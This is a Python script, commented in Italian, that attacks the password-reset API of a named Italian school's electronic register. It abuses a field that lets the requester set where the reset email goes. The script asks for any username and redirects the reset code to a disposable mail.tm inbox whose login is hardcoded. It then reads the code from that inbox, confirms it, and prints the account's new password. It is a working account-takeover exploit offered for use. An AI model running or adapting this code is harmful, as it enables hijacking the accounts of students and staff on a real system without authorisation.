import requests
import json
import time
import re
from datetime import datetime

# Configurazione
BASE_MAIL = "https://api.mail.tm"
EMAIL = "bypassdedalo@dollicons.com"
PASSWORD = "LAgw$TXfXY3tBLN"
URL_RESET = "https://registro.orsoline.it/oneClickSchoolWs/api/resetPwd/resetPassword"

# Headers comuni per le richieste reset
HEADERS = {
    'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 16; A142P Build/BP2A.250605.031.A3)",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip",
    'Content-Type': "application/json; charset=utf-8"
}

class EmailMonitor:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.token = None
        self.seen_messages = set()
        self.load_seen_messages()
        
    def load_seen_messages(self):
        """Carica i messaggi già visti dalle sessioni precedenti"""
        try:
            with open('seen_messages.txt', 'r') as f:
                self.seen_messages = set(line.strip() for line in f)
            print(f"Caricati {len(self.seen_messages)} messaggi già processati")
        except FileNotFoundError:
            pass
    
    def save_seen_message(self, msg_id):
        """Salva un messaggio come già visto"""
        self.seen_messages.add(msg_id)
        try:
            with open('seen_messages.txt', 'a') as f:
                f.write(f"{msg_id}\n")
        except:
            pass
    
    def get_token(self):
        """Ottiene il token di autenticazione per mail.tm"""
        try:
            r = requests.post(
                f"{BASE_MAIL}/token",
                json={"address": self.email, "password": self.password}
            )
            r.raise_for_status()
            self.token = r.json()["token"]
            return True
        except Exception as e:
            print(f"Errore autenticazione email: {e}")
            return False
    
    def get_messages(self):
        """Recupera i messaggi dalla inbox"""
        if not self.token and not self.get_token():
            return None
            
        headers = {"Authorization": f"Bearer {self.token}"}
        try:
            r = requests.get(f"{BASE_MAIL}/messages", headers=headers)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            print(f"Errore recupero messaggi: {e}")
            self.token = None
            return None
    
    def read_message(self, msg_id):
        """Legge un messaggio specifico"""
        headers = {"Authorization": f"Bearer {self.token}"}
        try:
            r = requests.get(f"{BASE_MAIL}/messages/{msg_id}", headers=headers)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            print(f"Errore lettura messaggio: {e}")
            return None
    
    def extract_reset_code(self, text):
        """Estrae il codice di reset dal testo dell'email - VERSIONE MIGLIORATA"""
        print("\n🔍 CERCO CODICE NEL TESTO:")
        print(f"Testo ricevuto: '{text[:100]}...'")
        
        # Metodo 1: Cerca pattern con 3 caratteri, trattino, 3 caratteri
        pattern1 = r'[A-Z0-9]{3}-[A-Z0-9]{3}'
        match = re.search(pattern1, text, re.IGNORECASE)
        if match:
            codice = match.group(0).upper()
            print(f"✅ Trovato con pattern1: {codice}")
            return codice
        
        # Metodo 2: Cerca qualsiasi gruppo di 6-7 caratteri che contiene un trattino
        words = re.findall(r'\S+', text)
        for word in words:
            word = word.strip()
            if '-' in word and len(word) >= 5 and len(word) <= 8:
                # Pulisci il codice da caratteri indesiderati
                clean_word = re.sub(r'[^A-Z0-9-]', '', word.upper())
                if re.match(r'[A-Z0-9]{3}-[A-Z0-9]{3}', clean_word):
                    print(f"✅ Trovato con pattern2 (parola '{word}' -> pulito '{clean_word}')")
                    return clean_word
        
        # Metodo 3: Cerca nel testo con regex più flessibile
        pattern3 = r'([A-Z0-9]{3}[-\s]?[A-Z0-9]{3})'
        matches = re.findall(pattern3, text, re.IGNORECASE)
        if matches:
            codice = matches[0].upper().replace(' ', '-')
            if '-' not in codice and len(codice) == 6:
                codice = codice[:3] + '-' + codice[3:]
            print(f"✅ Trovato con pattern3: {codice}")
            return codice
        
        # Metodo 4: Cerca vicino a parole chiave
        lines = text.split('\n')
        for line in lines:
            if 'codice' in line.lower() or 'code' in line.lower():
                words = re.findall(r'\S+', line)
                for word in words:
                    if len(word) >= 5 and len(word) <= 8 and '-' in word:
                        print(f"✅ Trovato vicino a 'codice': {word}")
                        return word.upper()
        
        print("❌ Nessun codice trovato")
        return None
    
    def extract_new_password(self, text):
        """Estrae la nuova password dal testo dell'email"""
        print("\n🔍 CERCO PASSWORD NEL TESTO:")
        
        # Dividi il testo in parti
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Criteri per identificare una password:
            # - Lunghezza tra 5 e 15 caratteri
            # - Contiene sia lettere che numeri
            # - Non contiene spazi
            # - Non contiene parole comuni
            if (5 <= len(line) <= 15 and 
                re.search(r'[A-Za-z]', line) and 
                re.search(r'[0-9]', line) and
                ' ' not in line and
                not any(word in line.lower() for word in ['password', 'codice', 'reset', 'step', 'dedalo', 'messaggio'])):
                print(f"✅ Trovata possibile password: '{line}'")
                return line
        
        # Cerca in tutte le parole
        words = re.findall(r'\S+', text)
        for word in words:
            word = word.strip()
            if (5 <= len(word) <= 15 and 
                re.search(r'[A-Za-z]', word) and 
                re.search(r'[0-9]', word) and
                not any(x in word.lower() for x in ['password', 'codice', 'reset', 'step'])):
                print(f"✅ Trovata password tra le parole: '{word}'")
                return word
        
        print("❌ Nessuna password trovata")
        return None
    
    def wait_for_email(self, email_type, timeout=60):
        """
        Aspetta un'email specifica
        email_type: "code" per codice reset, "password" per nuova password
        """
        start_time = time.time()
        last_count = 0
        
        print(f"\n⏳ In attesa di email di tipo: {email_type} (timeout: {timeout}s)")
        
        while time.time() - start_time < timeout:
            inbox = self.get_messages()
            
            if inbox and "hydra:member" in inbox:
                messages = inbox["hydra:member"]
                
                for msg in messages:
                    msg_id = msg["id"]
                    
                    # Salta messaggi già visti
                    if msg_id in self.seen_messages:
                        continue
                    
                    # Leggi il messaggio completo
                    msg_data = self.read_message(msg_id)
                    if not msg_data:
                        continue
                    
                    text = msg_data.get("text", "")
                    subject = msg_data.get("subject", "")
                    from_addr = msg_data.get("from", {}).get("address", "")
                    
                    print(f"\n{'='*60}")
                    print(f"📧 NUOVA EMAIL ({datetime.now().strftime('%H:%M:%S')})")
                    print(f"{'='*60}")
                    print(f"From: {from_addr}")
                    print(f"Subject: {subject}")
                    print(f"{'-'*60}")
                    print("📝 TESTO COMPLETO:")
                    print(text)
                    print(f"{'-'*60}")
                    
                    # Estrai in base al tipo richiesto
                    if email_type == "code":
                        reset_code = self.extract_reset_code(text)
                        if reset_code:
                            print(f"\n✅✅ CODICE TROVATO: {reset_code} ✅✅")
                            self.save_seen_message(msg_id)
                            return reset_code
                    
                    elif email_type == "password":
                        new_password = self.extract_new_password(text)
                        if new_password:
                            print(f"\n✅✅ PASSWORD TROVATA: {new_password} ✅✅")
                            self.save_seen_message(msg_id)
                            return new_password
                    
                    # Salva come visto solo se non abbiamo trovato quello che cercavamo
                    # ma l'email è del tipo giusto
                    if (email_type == "code" and "Step 1" in subject) or \
                       (email_type == "password" and "Step 2" in subject):
                        print(f"\n⚠️ Email del tipo giusto ma nessun dato estratto")
                        self.save_seen_message(msg_id)
                    else:
                        # Se non è del tipo che cerchiamo, non la salviamo come vista
                        # così potremo processarla quando cercheremo l'altro tipo
                        pass
            
            # Indicatore di attività
            print(".", end="", flush=True)
            time.sleep(2)
        
        print(f"\n❌ Timeout dopo {timeout} secondi")
        return None

def step1_request_reset(username):
    """Step 1: Richiedi reset password"""
    print(f"\n{'='*60}")
    print("📤 STEP 1: Richiesta reset password")
    print(f"{'='*60}")
    print(f"👤 Username: {username}")
    
    payload = {
        "nomeSP": "AAUSRT_setCodiceReset",
        "username": username,
        "stepReset": "0",
        "nomeScuola": "dedalo",
        "indirizzoEmailTo": EMAIL
    }
    
    try:
        response = requests.post(URL_RESET, data=json.dumps(payload), headers=HEADERS)
        print(f"📡 Risposta server: {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Errore: {e}")
        return False

def step2_verify_code(username, reset_code):
    """Step 2: Verifica il codice ricevuto"""
    print(f"\n{'='*60}")
    print("📤 STEP 2: Verifica codice reset")
    print(f"{'='*60}")
    print(f"👤 Username: {username}")
    print(f"🔑 Codice: {reset_code}")
    
    payload = {
        "username": username,
        "stepReset": "1",
        "nomeScuola": "dedalo",
        "codiceReset": reset_code,
        "indirizzoEmailTo": EMAIL
    }
    
    try:
        response = requests.post(URL_RESET, data=json.dumps(payload), headers=HEADERS)
        print(f"📡 Risposta server: {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Errore: {e}")
        return False

def main():
    print("🔐 RESET PASSWORD ONECLICKSCHOOL")
    print("="*60)
    
    # Inizializza monitor email
    print("\n📧 Inizializzazione monitoraggio email...")
    email_monitor = EmailMonitor(EMAIL, PASSWORD)
    
    if not email_monitor.get_token():
        print("❌ Errore: impossibile connettersi al servizio email")
        return
    
    print(f"✅ Monitoraggio attivo per: {EMAIL}")
    print("📝 I messaggi già processati in sessioni precedenti verranno ignorati\n")
    
    # Chiedi username
    username = input("👤 Inserisci username: ").strip()
    
    if not username:
        print("❌ Username non valido")
        return
    
    # STEP 1: Richiedi reset
    if not step1_request_reset(username):
        print("❌ Errore nella richiesta di reset")
        return
    
    # Attendi il codice di reset
    print("\n⏳ In attesa del codice di reset via email...")
    reset_code = email_monitor.wait_for_email("code", timeout=60)
    
    if not reset_code:
        print("❌ Timeout: nessun codice ricevuto")
        return
    
    # STEP 2: Verifica il codice
    if not step2_verify_code(username, reset_code):
        print("❌ Errore nella verifica del codice")
        return
    
    # Attendi la nuova password
    print("\n⏳ In attesa della nuova password via email...")
    new_password = email_monitor.wait_for_email("password", timeout=60)
    
    if not new_password:
        print("❌ Timeout: nessuna password ricevuta")
        return
    
    # Mostra il risultato finale
    print("\n" + "🎉"*20)
    print("🎉 OPERAZIONE COMPLETATA CON SUCCESSO! 🎉")
    print("🎉"*20)
    print(f"\n📋 CREDENZIALI:")
    print(f"   Username: {username}")
    print(f"   Password: {new_password}")
    print("\n💾 Conserva queste credenziali in un luogo sicuro.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Programma interrotto dall'utente")
    except Exception as e:
        print(f"\n❌ Errore imprevisto: {e}")
